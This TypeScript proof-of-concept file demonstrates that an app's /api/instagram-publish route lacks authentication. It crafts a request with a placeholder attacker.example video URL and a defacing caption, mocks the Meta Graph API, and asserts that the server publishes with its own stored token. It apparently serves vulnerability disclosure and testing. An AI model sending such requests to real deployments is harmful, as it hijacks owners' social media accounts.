/**
 * PoC: Unauthenticated Instagram Reel publishing via POST /api/instagram-publish
 *
 * Vulnerability
 * -------------
 * app/api/instagram-publish/route.ts has NO caller authentication. When the
 * request body omits `accessToken`, resolveCredentials() (app/lib/instagram.ts)
 * falls back to the server-configured INSTAGRAM_ACCESS_TOKEN / INSTAGRAM_ACCOUNT_ID
 * env vars. Any unauthenticated internet client can therefore publish an
 * attacker-chosen video to the owner's Instagram account using the server's
 * stored credentials.
 *
 * This PoC exercises the REAL route handler (app/api/instagram-publish/route.ts)
 * and the REAL publish logic (app/lib/instagram.ts). Only the external Meta Graph
 * API is mocked (via global.fetch) so that NO live Instagram account or service is
 * touched. The mock records what the server sent to Meta, proving the server used
 * its OWN secret token and the attacker's videoUrl.
 *
 * Run:  npx tsx security/poc/instagram_publish_unauth_poc.ts
 */

// --- Server-side secrets the attacker must NOT know or possess ---
const SERVER_SECRET_TOKEN = 'SERVER_ONLY_SECRET_ig_token_DO_NOT_LEAK';
const SERVER_IG_ACCOUNT_ID = '17841400000000000'; // the owner's IG professional account
process.env.INSTAGRAM_ACCESS_TOKEN = SERVER_SECRET_TOKEN;
process.env.INSTAGRAM_ACCOUNT_ID = SERVER_IG_ACCOUNT_ID;
// Note: NO ADMIN_KEY is set/required anywhere in this flow.

type GraphCall = { method: string; url: string; params: Record<string, string> };
const graphCalls: GraphCall[] = [];

const realFetch = globalThis.fetch;
// Mock ONLY graph.facebook.com. Everything else would hit the real network
// (nothing else is called in this flow).
globalThis.fetch = (async (input: any, init?: any): Promise<Response> => {
  const url = typeof input === 'string' ? input : input.url;
  if (!url.includes('graph.facebook.com')) {
    return realFetch(input, init);
  }
  const u = new URL(url);
  const params: Record<string, string> = {};
  u.searchParams.forEach((v, k) => (params[k] = v));
  const method = (init?.method || 'GET').toUpperCase();
  graphCalls.push({ method, url: u.origin + u.pathname, params });

  const json = (obj: any) =>
    new Response(JSON.stringify(obj), { status: 200, headers: { 'content-type': 'application/json' } });

  // POST /{ig-user-id}/media  -> create reel container
  if (method === 'POST' && u.pathname.endsWith('/media')) {
    return json({ id: 'MOCK_CONTAINER_123' });
  }
  // GET /{creation-id}?fields=status_code -> container ready
  if (method === 'GET' && u.pathname.endsWith('/MOCK_CONTAINER_123')) {
    return json({ status_code: 'FINISHED' });
  }
  // POST /{ig-user-id}/media_publish -> publish
  if (method === 'POST' && u.pathname.endsWith('/media_publish')) {
    return json({ id: 'MOCK_PUBLISHED_POST_456' });
  }
  return json({ error: { message: 'unexpected graph call ' + u.pathname } });
}) as typeof fetch;

async function main() {
  // Import the REAL route AFTER env + fetch are set up.
  const { POST } = await import('../../app/api/instagram-publish/route');
  const { NextRequest } = await import('next/server');

  // --- Attacker request: no auth, no token, attacker-controlled video ---
  const attackerVideo = 'https://attacker.example/defaced-propaganda.mp4';
  const attackerCaption = 'Pwned by an unauthenticated stranger #️⃣';
  const req = new NextRequest('http://victim-site.example/api/instagram-publish', {
    method: 'POST',
    headers: { 'content-type': 'application/json' }, // NOTE: no X-Admin-Key, no Authorization, no cookie
    body: JSON.stringify({ videoUrl: attackerVideo, caption: attackerCaption }),
  });

  const res = await POST(req);
  const out = await res.json();

  console.log('=== HTTP response from /api/instagram-publish ===');
  console.log('status:', res.status);
  console.log('body  :', JSON.stringify(out));
  console.log();
  console.log('=== Calls the server made to Meta Graph API ===');
  for (const c of graphCalls) {
    const redacted = { ...c.params };
    console.log(`${c.method} ${c.url}`);
    console.log('   access_token =', redacted.access_token);
    if (redacted.video_url) console.log('   video_url    =', redacted.video_url);
    if (redacted.caption) console.log('   caption      =', redacted.caption);
    if (redacted.creation_id) console.log('   creation_id  =', redacted.creation_id);
  }
  console.log();

  // --- Assertions that prove the exploit ---
  const createCall = graphCalls.find((c) => c.url.endsWith('/media') && c.method === 'POST');
  const publishCall = graphCalls.find((c) => c.url.endsWith('/media_publish'));

  const checks: [string, boolean][] = [
    ['Route returned HTTP 200 for an unauthenticated caller', res.status === 200],
    ['Route reported success', out.success === true],
    ['A post id was returned to the attacker', out.postId === 'MOCK_PUBLISHED_POST_456'],
    ['Server used its OWN secret token (not supplied by attacker)', createCall?.params.access_token === SERVER_SECRET_TOKEN],
    ['Server published to the OWNER account id', createCall?.url.includes(SERVER_IG_ACCOUNT_ID) === true],
    ["Attacker's videoUrl was sent to Meta", createCall?.params.video_url === attackerVideo],
    ["Attacker's caption was sent to Meta", createCall?.params.caption === attackerCaption],
    ['media_publish was invoked with the server token', publishCall?.params.access_token === SERVER_SECRET_TOKEN],
  ];

  let allPass = true;
  console.log('=== Exploit assertions ===');
  for (const [label, ok] of checks) {
    console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}`);
    if (!ok) allPass = false;
  }
  console.log();
  if (allPass) {
    console.log('EXPLOIT CONFIRMED: an unauthenticated attacker published an arbitrary');
    console.log('video to the owner\'s Instagram using the server\'s stored token.');
    process.exit(0);
  } else {
    console.log('PoC did not reproduce the exploit.');
    process.exit(1);
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
